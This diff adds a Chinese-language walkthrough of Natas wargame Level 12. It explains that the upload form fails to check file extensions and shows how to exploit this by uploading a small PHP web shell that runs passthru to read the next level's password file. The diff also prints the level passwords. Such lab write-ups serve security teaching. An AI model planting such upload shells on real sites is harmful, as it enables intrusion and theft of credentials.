@@ -221,3 +221,42 @@ key = bytes(map(xor_enc, data, data_xor))
 ```html
 The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
 ```
+
+### Level12
+PHP源码，只贴核心部分
+```php
+<?  
+function makeRandomPath($dir, $ext) { 
+    do { 
+    $path = $dir."/".genRandomString().".".$ext; 
+    } while(file_exists($path)); 
+    return $path; 
+} 
+function makeRandomPathFromFilename($dir, $fn) { 
+    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
+    return makeRandomPath($dir, $ext); 
+} 
+if(array_key_exists("filename", $_POST)) { 
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
+    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
+        echo "File is too big"; 
+    } else { 
+        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
+            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
+        } else{ 
+            echo "There was an error uploading the file, please try again!"; 
+        } 
+    } 
+}
+?> 
+```
+未对扩展名做检测，于是将表单中 `filename` 项改为.php结尾，上传如下文件
+```php
+<?
+passthru("cat /etc/natas_webpass/natas13");
+?>
+```
+之后访问上传上去的php页面得到natas13的密码
+```text
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+```
